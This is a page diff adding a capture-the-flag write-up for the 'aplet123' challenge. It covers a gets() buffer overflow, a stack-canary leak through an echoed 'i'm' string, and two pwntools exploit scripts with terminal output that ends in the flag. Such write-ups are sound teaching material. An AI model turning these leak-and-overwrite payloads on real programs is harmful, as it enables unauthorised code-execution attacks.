@@ -352,7 +352,7 @@
 
 </span>
       
-        0 min
+        4 mins
       
     
     
@@ -386,9 +386,232 @@
 
 
 
+  <div class="toc">
+    <details >
+      <summary accesskey="c" title="(Alt+C)">
+        Table of Contents
+      </summary>
+      <div class="toc-innr">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#source-code-analysis">Source code analysis</a></li>
+    <li><a href="#escape-the-canary">Escape the canary</a></li>
+    <li><a href="#buffer-overflow">Buffer Overflow</a></li>
+  </ul>
+</nav>
+      </div>
+    </details>
+  </div>
+  
 
 
 
+<p>We are provided with a binary named <code>aplet123</code> with the following protections.</p>
+<pre>    Arch:       amd64-64-little
+    RELRO:      <font color="#A2734C">Partial RELRO</font>
+    Stack:      <font color="#26A269">Canary found</font>
+    NX:         <font color="#26A269">NX enabled</font>
+    PIE:        <font color="#C01C28">No PIE (0x400000)</font>
+    Stripped:   <font color="#C01C28">No</font></pre>
+<p>Also its source code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;time.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">print_flag</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> flag[<span style="color:#ae81ff">256</span>];
+</span></span><span style="display:flex;"><span>  FILE <span style="color:#f92672">*</span>flag_file <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fgets</span>(flag, <span style="color:#66d9ef">sizeof</span> flag, flag_file);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(flag);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">const</span> responses[] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;L&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;amongus&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;true&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;pickle&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;GINKOID&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;L bozo&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;wtf&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;not with that attitude&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;increble&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;based&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;so true&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;monka&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;wat&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;monkaS&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;banned&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;holy based&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;daz crazy&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;smh&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;bruh&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;lol&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;mfw&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;skissue&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;so relatable&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;copium&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;untrue!&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;rolled&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;cringe&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;unlucky&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;lmao&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;eLLe&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;loser!&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;cope&#34;</span>,
+</span></span><span style="display:flex;"><span>                                 <span style="color:#e6db74">&#34;I use arch btw&#34;</span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stdout, NULL);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">srand</span>(<span style="color:#a6e22e">time</span>(NULL));
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;hello&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">gets</span>(input);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s <span style="color:#f92672">=</span> <span style="color:#a6e22e">strstr</span>(input, <span style="color:#e6db74">&#34;i&#39;m&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (s) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;hi %s, i&#39;m aplet123</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;please give me the flag&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;i&#39;ll consider it&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">5</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;no&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strcmp</span>(input, <span style="color:#e6db74">&#34;bye&#34;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;bye&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(responses[<span style="color:#a6e22e">rand</span>() <span style="color:#f92672">%</span> (<span style="color:#66d9ef">sizeof</span> responses <span style="color:#f92672">/</span> <span style="color:#66d9ef">sizeof</span> responses[<span style="color:#ae81ff">0</span>])]);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div>
+<h2 id="source-code-analysis">
+  Source code analysis
+  
+  <a hidden class="anchor" href="#source-code-analysis">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h2>
+<p>We see that it defines a <code>print_flag()</code> function that reads and displays the flag on the screen. In <code>main()</code>, we define a 64-byte buffer and take our input using <code>gets()</code>, an insecure function that does not validate the size of the input, leaving the program vulnerable to a <em>Buffer Overflow</em>. This allows us to overflow the buffer and corrupt memory. To solve the challenge, we must first filter the stack canary value and then take advantage of the <em>Buffer Overflow</em> to redirect execution to <code>print_flag()</code>.</p>
+
+<h2 id="escape-the-canary">
+  Escape the canary
+  
+  <a hidden class="anchor" href="#escape-the-canary">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h2>
+<p>To escape the canary we must look at the following part of the code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>s <span style="color:#f92672">=</span> <span style="color:#a6e22e">strstr</span>(input, <span style="color:#e6db74">&#34;i&#39;m&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (s) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;hi %s, i&#39;m aplet123</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, s <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    ....
+</span></span></code></pre></div><p>The conditional if checks if the string <code>i'm</code> is in our input, if so it prints it on stdout. If we introduce a string with <code>i'm</code> at the end it is obvious that 7 bytes of the canary are filtered, we must program a script that defines the buffer_size (64 + 8) and sends a string with <code>i'm</code> at the end.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Context and open binary</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./aplet123&#39;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./aplet123&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Padding 64 + 8</span>
+</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">72</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Leaking it</span>
+</span></span><span style="display:flex;"><span>trigger_canary <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (buffer_size <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;i&#39;m&#34;</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(trigger_canary)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;hi &#39;</span>)
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">7</span>)
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> u64(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> canary)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Canary found: </span><span style="color:#e6db74">{</span>hex(canary)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>By executing the script we will be able to escape the canary from the binary without problems.</p>
+<pre><font color="#F66151"><b>$</b></font> python3 canary.py 
+    Arch:       amd64-64-little
+    RELRO:      <font color="#A2734C">Partial RELRO</font>
+    Stack:      <font color="#26A269">Canary found</font>
+    NX:         <font color="#26A269">NX enabled</font>
+    PIE:        <font color="#C01C28">No PIE (0x400000)</font>
+    Stripped:   <font color="#C01C28">No</font>
+[<font color="#33D17A"><b>+</b></font>] Starting local process &apos;./aplet123&apos;: pid 202718
+[<font color="#2A7BDE"><b>*</b></font>] Canary found: 0xa23c60488cb7e300
+[<font color="#2A7BDE"><b>*</b></font>] Switching to interactive mode
+\xa0\xd5+?\xfc\x7f, i&apos;m aplet123</pre>
+<blockquote>
+<p>Remember that in linux stack canaries end in <code>00</code>, this makes them much easier to detect.</p>
+</blockquote>
+<p>Once the canary has been filtered, we have to exploit the <em>Buffer Overflow</em> and redirect the execution to the <code>print_flag</code> function.</p>
+
+<h2 id="buffer-overflow">
+  Buffer Overflow
+  
+  <a hidden class="anchor" href="#buffer-overflow">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M172.5 131.1C228.1 75.51 320.5 75.51 376.1 131.1C426.1 181.1 433.5 260.8 392.4 318.3L391.3 319.9C381 334.2 361 337.6 346.7 327.3C332.3 317 328.9 297 339.2 282.7L340.3 281.1C363.2 249 359.6 205.1 331.7 177.2C300.3 145.8 249.2 145.8 217.7 177.2L105.5 289.5C73.99 320.1 73.99 372 105.5 403.5C133.3 431.4 177.3 435 209.3 412.1L210.9 410.1C225.3 400.7 245.3 404 255.5 418.4C265.8 432.8 262.5 452.8 248.1 463.1L246.5 464.2C188.1 505.3 110.2 498.7 60.21 448.8C3.741 392.3 3.741 300.7 60.21 244.3L172.5 131.1zM467.5 380C411 436.5 319.5 436.5 263 380C213 330 206.5 251.2 247.6 193.7L248.7 192.1C258.1 177.8 278.1 174.4 293.3 184.7C307.7 194.1 311.1 214.1 300.8 229.3L299.7 230.9C276.8 262.1 280.4 306.9 308.3 334.8C339.7 366.2 390.8 366.2 422.3 334.8L534.5 222.5C566 191 566 139.1 534.5 108.5C506.7 80.63 462.7 76.99 430.7 99.9L429.1 101C414.7 111.3 394.7 107.1 384.5 93.58C374.2 79.2 377.5 59.21 391.9 48.94L393.5 47.82C451 6.731 529.8 13.25 579.8 63.24C636.3 119.7 636.3 211.3 579.8 267.7L467.5 380z"/></svg>
+
+
+ </a>
+  
+</h2>
+<p>We see that it defines a 64-byte buffer.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> input[<span style="color:#ae81ff">64</span>];
+</span></span></code></pre></div><p>This means that we have to send 64 bytes, a RET gadget, after the ret gadget the address of the escaped canary and the address of the <code>print_flag()</code> function, with this we solve the challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Context and open binary</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./aplet123&#39;</span>)
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;box.acmcyber.com&#39;</span>, <span style="color:#ae81ff">31123</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Padding 64 + 8</span>
+</span></span><span style="display:flex;"><span>buffer_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">72</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Leaking it</span>
+</span></span><span style="display:flex;"><span>trigger_canary <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (buffer_size <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;i&#39;m&#34;</span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(trigger_canary)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;hi &#39;</span>)
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">7</span>)
+</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> u64(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> canary)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;Canary found: </span><span style="color:#e6db74">{</span>hex(canary)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>junk <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> offset
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> junk					        <span style="color:#75715e"># buffer</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000401016</span>)		<span style="color:#75715e"># ret gadget</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(canary)				    <span style="color:#75715e"># canary</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x90</span>)				    <span style="color:#75715e"># NOP instruction</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00000000004011e6</span>)		<span style="color:#75715e"># info_function()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>By running the exploit we can solve the challenge and get the flag.</p>
+<pre><font color="#F66151"><b>$</b></font> python3 canary.py 
+    Arch:       amd64-64-little
+    RELRO:      <font color="#A2734C">Partial RELRO</font>
+    Stack:      <font color="#26A269">Canary found</font>
+    NX:         <font color="#26A269">NX enabled</font>
+    PIE:        <font color="#C01C28">No PIE (0x400000)</font>
+    Stripped:   <font color="#C01C28">No</font>
+[<font color="#33D17A"><b>+</b></font>] Opening connection to box.acmcyber.com on port 31123: Done
+[<font color="#2A7BDE"><b>*</b></font>] Canary found: 0xd926b28a61c3ed00
+[<font color="#2A7BDE"><b>*</b></font>] Switching to interactive mode
+\x01, i&apos;m aplet123
+smh
+<font color="#F66151"><b>$</b></font> bye
+bye
+lactf{so_untrue_ei2p1wfwh9np2gg6}
+
+[<font color="#2A7BDE"><b>*</b></font>] Got EOF while reading in interactive</pre>
 
 
 
